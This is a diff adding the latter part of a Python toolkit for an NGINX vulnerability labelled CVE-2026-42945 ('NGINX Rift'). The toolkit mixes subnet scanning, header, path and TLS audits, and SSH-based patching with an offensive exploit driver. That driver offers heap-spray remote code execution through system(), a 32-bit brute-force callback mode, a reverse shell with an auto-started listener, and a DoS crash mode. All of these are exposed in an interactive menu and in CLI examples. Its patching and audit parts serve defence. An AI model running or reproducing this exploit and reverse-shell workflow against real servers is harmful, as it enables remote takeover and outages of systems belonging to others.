+def patch_server(host: str, port: int, user: str, password: str | None = None,
+                 key_path: str | None = None, dry_run: bool = False,
+                 target_version: str = "1.30.1") -> dict:
+    """SSH remote patching (gagaltotal style)."""
+    if not _HAS_PARAMIKO:
+        return {"error": "paramiko not installed"}
+    result = {"host": host, "status": "pending", "steps": []}
+
+    def add_step(name: str, status: str, detail: str = ""):
+        result["steps"].append({"step": name, "status": status, "detail": detail})
+
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        if password:
+            client.connect(host, port=port, username=user, password=password, timeout=15)
+        elif key_path:
+            k = paramiko.RSAKey.from_private_key_file(key_path)
+            client.connect(host, port=port, username=user, pkey=k, timeout=15)
+        else:
+            return {"error": "no auth method provided"}
+
+        add_step("connect", "ok", f"SSH to {host}:{port} as {user}")
+
+        # Detect OS
+        _, stdout, _ = client.exec_command("cat /etc/os-release 2>/dev/null | head -3")
+        os_out = stdout.read().decode().lower()
+        distro = None
+        for d in PATCH_COMMANDS:
+            if d in os_out:
+                distro = d
+                break
+        if not distro:
+            _, stdout, _ = client.exec_command("cat /etc/redhat-release 2>/dev/null")
+            rh = stdout.read().decode().lower()
+            if "centos" in rh: distro = "centos"
+            elif "alma" in rh: distro = "almalinux"
+            elif "red hat" in rh: distro = "rhel"
+        if not distro:
+            distro = "ubuntu"
+        add_step("detect_os", "ok", distro)
+
+        # Current version
+        _, stdout, _ = client.exec_command("nginx -v 2>&1; echo '---'; /usr/sbin/nginx -v 2>&1")
+        ver = stdout.read().decode()
+        add_step("current_version", "ok", ver[:100])
+
+        if dry_run:
+            add_step("dry_run", "ok", "dry-run mode, no changes made")
+            result["status"] = "dry-run"
+            client.close()
+            return result
+
+        # Backup
+        cmds = PATCH_COMMANDS.get(distro, PATCH_COMMANDS["ubuntu"])
+        if "backup" in cmds:
+            _, stdout, stderr = client.exec_command(cmds["backup"])
+            add_step("backup", "ok", stdout.read().decode()[:100])
+
+        # Upgrade
+        if "upgrade" in cmds:
+            add_step("upgrade", "running", f"target: {target_version}")
+            _, stdout, stderr = client.exec_command(cmds["upgrade"], timeout=120)
+            out = stdout.read().decode()[:200]
+            err = stderr.read().decode()[:200]
+            add_step("upgrade", "ok" if "error" not in err.lower() else "warn",
+                     out + err)
+
+        # Verify
+        if target_version:
+            _, stdout, _ = client.exec_command(f"nginx -v 2>&1 | grep {target_version}")
+            verified = bool(stdout.read().decode().strip())
+            add_step("verify", "ok" if verified else "warn",
+                     f"nginx -v: {target_version} {'found' if verified else 'not found'}")
+
+        # Reload
+        if "reload" in cmds:
+            _, stdout, stderr = client.exec_command(cmds["reload"], timeout=30)
+            add_step("reload", "ok", stdout.read().decode()[:100] or stderr.read().decode()[:100])
+
+        result["status"] = "patched"
+        client.close()
+    except Exception as e:
+        result["status"] = "failed"
+        add_step("error", "err", str(e))
+
+    return result
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# MODULE 4: REPORT
+# ═══════════════════════════════════════════════════════════════════════
+
+def generate_html_scan_report(results: list[dict], out_path: str):
+    """Generate HTML report from scan results (gagaltotal/MateusVerass style)."""
+    vuln_count = sum(1 for r in results if r.get("vulnerable"))
+    safe_count = sum(1 for r in results if r.get("vulnerable") == False)
+    total = len(results)
+
+    rows = ""
+    for r in results:
+        cls = "vuln" if r.get("vulnerable") else ("safe" if r.get("vulnerable") == False else "unknown")
+        ver = r.get("nginx_version") or r.get("server") or "unknown"
+        os_info = r.get("os", "N/A")
+        rows += f"<tr class='{cls}'><td>{r['host']}</td><td>{ver}</td><td>{os_info}</td><td>{cls}</td></tr>"
+
+    html = f"""<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><title>NGINX Rift — Scan Report</title>
+<style>
+body {{ font-family: -apple-system, 'Segoe UI', sans-serif; background: #0d1117; color: #e6edf3; padding: 2rem; }}
+h1 {{ color: #58a6ff; }}
+table {{ border-collapse: collapse; width: 100%; }}
+th {{ background: #161b22; color: #58a6ff; padding: .5rem; text-align: left; border-bottom: 2px solid #30363d; }}
+td {{ padding: .5rem; border-bottom: 1px solid #21262d; }}
+tr.vuln td {{ border-left: 3px solid #f85149; }}
+tr.safe td {{ border-left: 3px solid #3fb950; }}
+.summary {{ display: flex; gap: 1rem; margin: 1rem 0; }}
+.card {{ padding: 1rem; border-radius: 6px; background: #161b22; flex: 1; }}
+.card h3 {{ margin: 0 0 .3rem 0; }}
+.num {{ font-size: 2rem; font-weight: 700; }}
+.green {{ color: #3fb950; }}
+.red {{ color: #f85149; }}
+</style></head><body>
+<h1>NGINX Rift — Scan Report</h1>
+<div class="summary">
+  <div class="card"><h3>Total</h3><div class="num">{total}</div></div>
+  <div class="card"><h3>Vulnerable</h3><div class="num red">{vuln_count}</div></div>
+  <div class="card"><h3>Safe</h3><div class="num green">{safe_count}</div></div>
+</div>
+<table><thead><tr><th>Host</th><th>Version</th><th>OS</th><th>Status</th></tr></thead>
+<tbody>{rows}</tbody></table>
+</body></html>"""
+
+    Path(out_path).write_text(html)
+    log(f"Report saved: {out_path}", "ok")
+
+
+def generate_json_report(data: dict, out_path: str):
+    Path(out_path).write_text(json.dumps(data, indent=2, default=str))
+    log(f"JSON saved: {out_path}", "ok")
+
+
+def print_scan_results(results: list[dict]):
+    if _HAS_RICH:
+        c = get_console()
+        table = Table(title="Scan Results", box=rich_box.ROUNDED)
+        table.add_column("Host", style="cyan")
+        table.add_column("Version", style="green")
+        table.add_column("Vulnerable", style="yellow")
+        for r in results:
+            vuln = r.get("vulnerable")
+            v_str = "YES" if vuln else ("NO" if vuln is False else "?")
+            v_style = "red" if vuln else "green"
+            table.add_row(r["host"], r.get("nginx_version", "?"),
+                         f"[{v_style}]{v_str}[/]")
+        c.print(table)
+    else:
+        for r in results:
+            print(f"{r['host']:20s} {str(r.get('nginx_version', '?')):15s} "
+                  f"{'VULN' if r.get('vulnerable') else 'safe'}")
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# MODULE 5: WEB AUDIT (MateusVerass style)
+# ═══════════════════════════════════════════════════════════════════════
+
+def audit_headers(host: str, port: int) -> dict:
+    result = {}
+    try:
+        with socket.create_connection((host, port), timeout=5) as s:
+            s.sendall(b"GET / HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n")
+            data = s.recv(8192)
+            raw = data.decode("latin-1", errors="replace")
+            for hdr, desc in SECURITY_HEADERS:
+                m = re.search(rf'^{hdr}:\s*(.+)$', raw, re.I | re.M)
+                result[hdr] = {"present": bool(m), "value": m.group(1).strip() if m else None,
+                               "description": desc}
+    except OSError as e:
+        return {"error": str(e)}
+    return result
+
+
+def path_discovery(host: str, port: int) -> dict:
+    found = []
+    for path in INTERESTING_PATHS:
+        try:
+            with socket.create_connection((host, port), timeout=3) as s:
+                s.sendall(f"GET {path} HTTP/1.1\r\nHost:l\r\nConnection:close\r\n\r\n".encode())
+                data = s.recv(256)
+                status = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
+                found.append({"path": path, "status": status})
+        except OSError:
+            pass
+    return {"paths_found": found}
+
+
+def tls_audit(host: str, port: int) -> dict:
+    """Check TLS versions (1.0-1.3)."""
+    result = {}
+    import ssl
+    ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
+    ctx.check_hostname = False
+    ctx.verify_mode = ssl.CERT_NONE
+    
+    versions = []
+    for name, attr in [("TLSv1.0", "TLSv1"), ("TLSv1.1", "TLSv1_1"), 
+                       ("TLSv1.2", "TLSv1_2"), ("TLSv1.3", "TLSv1_3")]:
+        v = getattr(ssl.TLSVersion, attr, None)
+        if v is not None:
+            versions.append((name, v))
+
+    with warnings.catch_warnings():
+        warnings.simplefilter("ignore", DeprecationWarning)
+        for ver_name, ver_const in versions:
+            try:
+                ctx.minimum_version = ver_const
+                ctx.maximum_version = ver_const
+                with socket.create_connection((host, port), timeout=3) as s:
+                    with ctx.wrap_socket(s, server_hostname=host):
+                        result[ver_name] = True
+            except Exception:
+                result[ver_name] = False
+    return result
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# MODULE 6: AUTOMATION
+# ═══════════════════════════════════════════════════════════════════════
+
+def auto_scan(subnet: str, port: int, user: str = "root",
+              password: str | None = None, key_path: str | None = None,
+              output: str | None = None) -> list[dict]:
+    log(f"Auto-scan: {subnet} port {port}", "info")
+    live_hosts = scan_subnet(subnet, port)
+    results = []
+    for h in live_hosts:
+        svc = detect_service(h, port)
+        if svc.get("alive"):
+            if _HAS_PARAMIKO and (password or key_path):
+                ssh = scan_ssh(h, port=22, user=user, password=password, key_path=key_path)
+                svc.update(ssh)
+            results.append(svc)
+
+    if output:
+        if output.endswith(".json"):
+            generate_json_report({"scan_results": results}, output)
+        elif output.endswith(".html"):
+            generate_html_scan_report(results, output)
+
+    print_scan_results(results)
+    return results
+
+
+def auto_patch(subnet: str, port: int, user: str = "root",
+               password: str | None = None, key_path: str | None = None,
+               dry_run: bool = False) -> list[dict]:
+    log(f"Auto-patch: {subnet}", "info")
+    live = scan_subnet(subnet, port)
+    results = []
+    for h in live:
+        r = patch_server(h, port, user, password, key_path, dry_run)
+        results.append(r)
+        log(f"{h}: {r['status']}", "ok" if r['status'] == 'patched' else "err")
+    return results
+
+
+def auto_exploit(host: str, port: int, cmd: str, heap_base: int = 0,
+                 libc_base: int = 0, system_off: int = DEFAULT_SYSTEM_OFFSET,
+                 offsets: list[int] | None = None) -> ExploitResult:
+    hb = heap_base or DEFAULT_HEAP_BASE
+    lb = libc_base or DEFAULT_LIBC_BASE
+    off = offsets or DEFAULT_HEAP_OFFSETS
+    log(f"Auto-exploit: {host}:{port} cmd='{cmd}'", "info")
+    result = mode_exploit(host, port, cmd, hb, lb, system_off, off, 10)
+    if result.success:
+        log(f"RCE confirmed! system('{cmd}') executed", "ok")
+    else:
+        log(f"Exploit failed: {result.error or 'no crash detected'}", "err")
+    return result
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# INTERACTIVE TUI
+# ═══════════════════════════════════════════════════════════════════════
+
+def run_interactive():
+    """Rich-powered interactive menu."""
+    if not _HAS_RICH:
+        print("Interactive mode requires `rich`. Install: pip install rich")
+        print("Fallback to CLI mode — see --help")
+        return
+
+    c = get_console()
+    c.clear()
+    c.print(BANNER, style="bold cyan")
+    c.print("[dim]Interactive Super Toolkit — CVE-2026-42945[/dim]\n")
+
+    while True:
+        c.print(Panel.fit(
+            "[1] 🚀  Scan Network (subnet discovery)\n"
+            "[2] 🔍  Check Target (fingerprint + vuln check)\n"
+            "[3] 💥  Exploit Target (RCE via heap spray)\n"
+            "[4] 🖥  32-bit Brute Force (callback RCE)\n"
+            "[5] 🛡  Patch Target (SSH remote patch)\n"
+            "[6] 📋  Web Audit (headers, paths, TLS)\n"
+            "[7] 🌐  CIDR Auto-Scan → Report\n"
+            "[8] ⚡  DoS Test (crash verification)\n"
+            "[9] 📄  Generate Report (HTML/JSON)\n"
+            "[0] ❌  Exit",
+            title="Menu", border_style="cyan"
+        ))
+
+        choice = Prompt.ask("Select", choices=["0","1","2","3","4","5","6","7","8","9"])
+
+        if choice == "0":
+            c.print("[yellow]Goodbye![/]")
+            break
+
+        elif choice == "1":
+            subnet = Prompt.ask("CIDR subnet", default="192.168.1.0/24")
+            port = int(Prompt.ask("Port", default=str(DEFAULT_PORT)))
+            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"),
+                          transient=True) as p:
+                p.add_task("Scanning...", total=None)
+                hosts = scan_subnet(subnet, port)
+            if hosts:
+                t = Table(title=f"Live hosts on port {port}")
+                t.add_column("#", style="dim")
+                t.add_column("Host", style="cyan")
+                for i, h in enumerate(hosts, 1):
+                    t.add_row(str(i), h)
+                c.print(t)
+            else:
+                c.print("[yellow]No live hosts found.[/]")
+
+        elif choice == "2":
+            target = Prompt.ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
+            parsed = parse_target(target)
+            if not parsed:
+                c.print("[red]Invalid target[/]")
+                continue
+            host, port = parsed
+            with Progress(SpinnerColumn(), transient=True) as p:
+                p.add_task("Checking...", total=None)
+                check = mode_check(host, port)
+                svc = detect_service(host, port)
+                waf = detect_waf(host, port)
+            c.print(Panel(json.dumps(check, indent=2)[:1000], title="Check Result"))
+            c.print(f"[green]Server:[/] {svc.get('server', '?')}")
+            if waf:
+                c.print(f"[red]WAF detected: {', '.join(waf)}[/]")
+
+        elif choice == "3":
+            target = Prompt.ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
+            parsed = parse_target(target)
+            if not parsed:
+                c.print("[red]Invalid target[/]")
+                continue
+            host, port = parsed
+            use_shell = Confirm.ask("Use reverse shell?", default=False)
+            if use_shell:
+                lhost = Prompt.ask("Your IP", default="172.17.0.1")
+                lport = int(Prompt.ask("Listener port", default="1337"))
+                cmd = build_reverse_shell_cmd(lhost, lport)
+            else:
+                cmd = Prompt.ask("Command", default="id")
+
+            # Start listener if reverse shell
+            if use_shell:
+                t = threading.Thread(target=run_shell_listener, args=(lport,), daemon=True)
+                t.start()
+                time.sleep(0.5)
+
+            with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}")) as p:
+                p.add_task("Exploiting...", total=None)
+                result = mode_exploit(host, port, cmd, DEFAULT_HEAP_BASE,
+                                     DEFAULT_LIBC_BASE, DEFAULT_SYSTEM_OFFSET,
+                                     DEFAULT_HEAP_OFFSETS, 10)
+
+            if result.success:
+                c.print("[green]RCE CONFIRMED![/]")
+            else:
+                c.print(f"[red]Exploit failed: {result.error or 'no crash'}[/]")
+
+        elif choice == "4":
+            target = Prompt.ask("Target (host:port)", default="127.0.0.1:19331")
+            parsed = parse_target(target)
+            if not parsed:
+                c.print("[red]Invalid target[/]")
+                continue
+            host, port = parsed
+            cb_ip = Prompt.ask("Callback IP", default="host.docker.internal")
+            cb_port = int(Prompt.ask("Callback port", default="9876"))
+            cmd = Prompt.ask("Command", default="id")
+            c.print("[yellow]Starting 32-bit brute-force — this may take a while[/]")
+            r = mode_exploit_32(host, port, cmd, cb_ip, cb_port,
+                               DEFAULT_HEAP_PAGE_MIN, DEFAULT_HEAP_PAGE_MAX,
+                               DEFAULT_LIBC_PAGE_MIN, DEFAULT_LIBC_PAGE_MAX,
+                               DEFAULT_SYSTEM_OFF_32, DEFAULT_SPRAY_INTERNAL_OFF_32,
+                               DEFAULT_N_PLUS_32)
+            if r.get("success"):
+                c.print(f"[green]RCE CONFIRMED! Output: {r.get('output')}[/]")
+            else:
+                c.print(f"[red]Brute-force exhausted: {r.get('attempts_tried', 0)} tries[/]")
+
+        elif choice == "5":
+            target = Prompt.ask("Target (host:port)", default="192.168.1.100")
+            parsed = parse_target(target)
+            if not parsed:
+                c.print("[red]Invalid target[/]")
+                continue
+            host, _ = parsed
+            user = Prompt.ask("SSH user", default="root")
+            use_key = Confirm.ask("Use SSH key?", default=False)
+            key_path = Prompt.ask("Key path") if use_key else None
+            password = None if use_key else Prompt.ask("Password", password=True)
+            dry = Confirm.ask("Dry run?", default=False)
+            r = patch_server(host, port=22, user=user, password=password,
+                           key_path=key_path, dry_run=dry)
+            c.print(Panel(json.dumps(r, indent=2)[:800], title="Patch Result"))
+
+        elif choice == "6":
+            target = Prompt.ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
+            parsed = parse_target(target)
+            if not parsed:
+                c.print("[red]Invalid target[/]")
+                continue
+            host, port = parsed
+            with Progress(SpinnerColumn(), transient=True) as p:
+                p.add_task("Auditing...", total=None)
+                hdrs = audit_headers(host, port)
+                paths = path_discovery(host, port)
+                tls = tls_audit(host, port)
+            c.print(Panel(
+                "\n".join(f"{k}: {'✅' if v['present'] else '❌'} {(v.get('value') or '')[:40]}"
+                         for k, v in hdrs.items() if isinstance(v, dict)),
+                title="Security Headers"
+            ))
+            found_paths = [p["path"] + " → " + p["status"] for p in paths.get("paths_found", [])]
+            if found_paths:
+                c.print(Panel("\n".join(found_paths[:10]), title="Paths Found"))
+            c.print(f"TLS: {tls}")
+
+        elif choice == "7":
+            subnet = Prompt.ask("CIDR subnet", default="192.168.1.0/24")
+            port = int(Prompt.ask("Port", default=str(DEFAULT_PORT)))
+            output = Prompt.ask("Output file (HTML/JSON)", default="scan_report.html")
+            auto_scan(subnet, port, output=output)
+
+        elif choice == "8":
+            target = Prompt.ask("Target (host:port)", default=f"127.0.0.1:{DEFAULT_PORT}")
+            parsed = parse_target(target)
+            if not parsed:
+                c.print("[red]Invalid target[/]")
+                continue
+            host, port = parsed
+            size = int(Prompt.ask("Overflow size", default="200"))
+            r = mode_dos(host, port, size)
+            c.print(Panel(json.dumps(r, indent=2), title="DoS Result"))
+
+        elif choice == "9":
+            fmt = Prompt.ask("Format", choices=["html", "json"], default="html")
+            out = Prompt.ask("Output path", default=f"report.{fmt}")
+            data = {"timestamp": str(datetime.now()), "tool": "nginx-rift-super-toolkit",
+                    "version": VERSION, "note": "Report generated from interactive mode"}
+            if fmt == "html":
+                generate_html_scan_report([], out)
+            else:
+                generate_json_report(data, out)
+
+        input("\nPress Enter to continue...")
+        c.clear()
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# CLI ARGUMENT PARSER
+# ═══════════════════════════════════════════════════════════════════════
+
+def build_parser() -> argparse.ArgumentParser:
+    p = argparse.ArgumentParser(
+        prog="nginx-rift-super-toolkit.py",
+        description="CVE-2026-42945 (NGINX Rift) Super Toolkit — merged from 9 repos",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog="""
+Examples:
+  python nginx-rift-super-toolkit.py --check 192.168.1.100:19321
+  python nginx-rift-super-toolkit.py --exploit --host 10.0.0.5 --cmd id
+  python nginx-rift-super-toolkit.py --shell --host 10.0.0.5 --lhost 10.0.0.1
+  python nginx-rift-super-toolkit.py --auto-scan 192.168.1.0/24 -o report.html
+  python nginx-rift-super-toolkit.py --scan-subnet 192.168.1.0/24 --port 19321
+  python nginx-rift-super-toolkit.py --bruteforce-32 127.0.0.1:19331 callback.ip
+  python nginx-rift-super-toolkit.py --patch 192.168.1.100 --user root --password ...
+  python nginx-rift-super-toolkit.py --audit example.com:443
+  python nginx-rift-super-toolkit.py --dos --host 127.0.0.1 --port 19321
+        """
+    )
+
+    # Generic target
+    p.add_argument("--host", default="127.0.0.1", help="target host")
+    p.add_argument("--port", type=int, default=DEFAULT_PORT, help=f"target port (default {DEFAULT_PORT})")
+    p.add_argument("-t", "--target", help="target as host:port (overrides --host/--port)")
+
+    # Modes
+    p.add_argument("--check", action="store_true", help="detect-only: fingerprint + vuln pattern check (no overflow)")
+    p.add_argument("--exploit", action="store_true", help="full RCE exploitation")
+    p.add_argument("--shell", action="store_true", help="reverse shell mode")
+    p.add_argument("--dos", action="store_true", help="DoS crash verification")
+
+    # Exploit params
+    p.add_argument("--cmd", help="command to execute via system()")
+    p.add_argument("--lhost", "--listen-ip", default="172.17.0.1", help="reverse shell listener IP")
+    p.add_argument("--lport", "--listen-port", type=int, default=1337, help="reverse shell port")
+    p.add_argument("--heap-base", type=parse_int, help=f"heap base (default: {hex(DEFAULT_HEAP_BASE)})")
+    p.add_argument("--libc-base", type=parse_int, help=f"libc base (default: {hex(DEFAULT_LIBC_BASE)})")
+    p.add_argument("--system-offset", type=parse_int, default=DEFAULT_SYSTEM_OFFSET,
+                   help=f"system() offset (default: {hex(DEFAULT_SYSTEM_OFFSET)})")
+    p.add_argument("--offsets", type=str, help="comma-separated heap offsets")
+    p.add_argument("--tries", type=int, default=10, help="attempts per candidate")
+    p.add_argument("--n-spray", type=int, default=N_SPRAY, help="spray body count")
+    p.add_argument("--body-len", type=int, default=BODY_LEN, help="spray body length")
+    p.add_argument("--no-safe-check", action="store_true", help="skip URI-safe byte filtering")
+
+    # 32-bit brute-force
+    p.add_argument("--bruteforce-32", nargs=2, metavar=("TARGET", "CALLBACK_IP"),
+                   help="32-bit remote brute-force RCE")
+
+    # Subnet scan
+    p.add_argument("--scan-subnet", metavar="CIDR", help="scan CIDR subnet for live hosts")
+    p.add_argument("--scan-ssh", action="store_true", help="scan with SSH version detection")
+    p.add_argument("--user", default="root", help="SSH user")
+    p.add_argument("--password", help="SSH password")
+    p.add_argument("--key", "--key-path", dest="key_path", help="SSH private key path")
+    p.add_argument("--workers", type=int, default=20, help="scan worker threads")
+
+    # Auto modes
+    p.add_argument("--auto-scan", metavar="CIDR", help="auto-scan: discover + fingerprint + report")
+    p.add_argument("--auto-patch", metavar="CIDR", help="auto-patch: scan + patch + verify")
+    p.add_argument("--auto-exploit", metavar="TARGET", help="auto-exploit: fingerprint + exploit + report")
+
+    # Patch
+    p.add_argument("--patch", metavar="HOST", help="SSH remote patching of a single host")
+    p.add_argument("--dry-run", action="store_true", help="patch dry-run simulation")
+
+    # Web audit
+    p.add_argument("--audit", metavar="TARGET", help="full web audit (headers, paths, TLS, WAF)")
+    p.add_argument("--audit-headers", action="store_true", help="check security headers only")
+    p.add_argument("--audit-paths", action="store_true", help="discover interesting paths")
+
+    # Output
+    p.add_argument("-o", "--output", help="output file (HTML or JSON)")
+    p.add_argument("-j", "--json", action="store_true", help="JSON output mode")
+    p.add_argument("--verbose", "-v", action="store_true", help="verbose output")
+
+    return p
+
+
+# ═══════════════════════════════════════════════════════════════════════
+# MAIN
+# ═══════════════════════════════════════════════════════════════════════
+
+def main():
+    parser = build_parser()
+    args = parser.parse_args()
+
+    # If no arguments at all, launch interactive TUI
+    if len(sys.argv) == 1:
+        run_interactive()
+        return 0
+
+    # Resolve target
+    host = args.host
+    port = args.port
+    if args.target:
+        parsed = parse_target(args.target)
+        if parsed:
+            host, port = parsed
+
+    parsed_offsets = DEFAULT_HEAP_OFFSETS
+    if args.offsets:
+        parsed_offsets = [parse_int(x.strip()) for x in args.offsets.split(",") if x.strip()]
+
+    heap_base = args.heap_base or DEFAULT_HEAP_BASE
+    libc_base = args.libc_base or DEFAULT_LIBC_BASE
+
+    # ── CHECK (detect-only) ──
+    if args.check:
+        result = mode_check(host, port)
+        if args.json:
+            print(json.dumps(result, indent=2))
+        else:
+            for k, v in result.items():
+                print(f"{k}: {v}")
+        return 0 if result.get("verdict") and "present" in str(result.get("verdict")) else 1
+
+    # ── 32-bit BRUTE FORCE ──
+    if args.bruteforce_32:
+        target, cb_ip = args.bruteforce_32
+        parsed = parse_target(target)
+        if not parsed:
+            print("Invalid target for --bruteforce-32. Use host:port format.")
+            return 1
+        bh, bp = parsed
+        result = mode_exploit_32(bh, bp, args.cmd or "id", cb_ip, args.lport,
+                                DEFAULT_HEAP_PAGE_MIN, DEFAULT_HEAP_PAGE_MAX,
+                                DEFAULT_LIBC_PAGE_MIN, DEFAULT_LIBC_PAGE_MAX,
+                                args.system_offset, DEFAULT_SPRAY_INTERNAL_OFF_32,
+                                DEFAULT_N_PLUS_32)
+        if args.json:
+            print(json.dumps(result, indent=2))
+        else:
+            if result.get("success"):
+                print(f"[+] RCE CONFIRMED! Output: {result.get('output')}")
+            else:
+                print(f"[-] Brute-force exhausted: {result.get('attempts_tried', 0)} tries")
+        return 0 if result.get("success") else 2
+
+    # ── EXPLOIT ──
+    if args.exploit or args.shell:
+        cmd = args.cmd or ""
+        if args.shell:
+            cmd = build_reverse_shell_cmd(args.lhost, args.lport)
+        if not cmd:
+            print("--exploit requires --cmd or --shell")
+            return 1
+
+        if args.shell:
+            t = threading.Thread(target=run_shell_listener, args=(args.lport,), daemon=True)
+            t.start()
+            time.sleep(0.5)
+
+        result = mode_exploit(host, port, cmd, heap_base, libc_base,
+                             args.system_offset, parsed_offsets, args.tries)
+        if args.json:
+            print(json.dumps({
+                "success": result.success, "winning_addr": result.winning_addr,
+                "command_sent": result.command_sent, "attempts": result.attempts,
+                "error": result.error,
+            }, indent=2))
+        else:
+            if result.success:
+                print(f"[+] RCE CONFIRMED! Command sent: {cmd}")
+                print(f"[+] Winning address: {result.winning_addr}")
+            else:
+                print(f"[-] Exploit failed: {result.error or 'no crash detected'}")
+        return 0 if result.success else 3
+
+    # ── DoS ──
+    if args.dos:
+        result = mode_dos(host, port)
+        if args.json:
+            print(json.dumps(result, indent=2))
+        else:
+            if result.get("vulnerable"):
+                print("[!] Target appears VULNERABLE (worker crashed + recovered)")
+            else:
+                print("[*] No crash detected")
+        return 1 if result.get("vulnerable") else 0
+
+    # ── SUBNET SCAN ──
+    if args.scan_subnet:
+        hosts = scan_subnet(args.scan_subnet, port, args.workers)
+        results = []
+        for h in hosts:
+            svc = detect_service(h, port)
+            if svc.get("alive") and args.scan_ssh:
+                ssh = scan_ssh(h, user=args.user, password=args.password, key_path=args.key_path)
+                svc.update(ssh)
+            results.append(svc)
+        if args.output:
+            if args.output.endswith(".json"):
+                generate_json_report({"scan_results": results}, args.output)
+            else:
+                generate_html_scan_report(results, args.output)
+        print_scan_results(results)
+        return 0
+
+    # ── PATCH ──
+    if args.patch:
+        result = patch_server(args.patch, 22, args.user, args.password,
+                             args.key_path, args.dry_run)
+        if args.json:
+            print(json.dumps(result, indent=2))
+        else:
+            print(f"[{result['status']}] {args.patch}")
+            for step in result.get("steps", []):
+                print(f"  {step['step']}: {step['status']} — {step['detail'][:80]}")
+        return 0
+
+    # ── AUDIT ──
+    if args.audit:
+        host, port = parse_target(args.audit) or (host, port)
+        hdrs = audit_headers(host, port)
+        paths = path_discovery(host, port)
+        waf = detect_waf(host, port)
+        tls = tls_audit(host, port)
+        out = {"target": f"{host}:{port}", "headers": hdrs, "paths": paths, "waf": waf, "tls": tls}
+
+        if args.json:
+            print(json.dumps(out, indent=2))
+        else:
+            if isinstance(hdrs, dict) and "error" not in hdrs:
+                for k, v in hdrs.items():
+                    if isinstance(v, dict):
+                        mark = "✅" if v.get("present") else "❌"
+                        val = (v.get("value") or "")[:40]
+                        print(f"  {mark} {k}: {val}")
+            if waf:
+                print(f"  WAF: {', '.join(waf)}")
+            if paths.get("paths_found"):
+                print(f"  Paths: {len(paths['paths_found'])} found")
+            print(f"  TLS: {' '.join(k for k, v in tls.items() if v)}")
+
+        if args.output:
+            if args.output.endswith(".json"):
+                generate_json_report(out, args.output)
+            else:
+                generate_html_scan_report([out], args.output)
+        return 0
+
+    if args.audit_headers:
+        hdrs = audit_headers(host, port)
+        for k, v in hdrs.items():
+            if isinstance(v, dict):
+                val = (v.get("value") or "")[:60]
+                print(f"{'✅' if v['present'] else '❌'} {k}: {val}")
+        return 0
+
+    if args.audit_paths:
+        paths = path_discovery(host, port)
+        for p in paths.get("paths_found", []):
+            print(f"  {p['path']:20s} {p['status']}")
+        return 0
+
+    # ── AUTO MODES ──
+    if args.auto_scan:
+        auto_scan(args.auto_scan, port, args.user, args.password, args.key_path, args.output)
+        return 0
+
+    if args.auto_patch:
+        auto_patch(args.auto_patch, port, args.user, args.password, args.key_path, args.dry_run)
+        return 0
+
+    if args.auto_exploit:
+        parsed = parse_target(args.auto_exploit)
+        if parsed:
+            h, p = parsed
+            result = auto_exploit(h, p, args.cmd or "id", heap_base, libc_base,
+                                 args.system_offset, parsed_offsets)
+            if args.output:
+                generate_json_report({
+                    "target": f"{h}:{p}", "result": result.success,
+                    "winning_addr": result.winning_addr, "error": result.error,
+                }, args.output)
+        return 0
+
+    # No mode selected
+    parser.print_help()
+    return 0
+
+
+if __name__ == "__main__":
+    sys.exit(main())
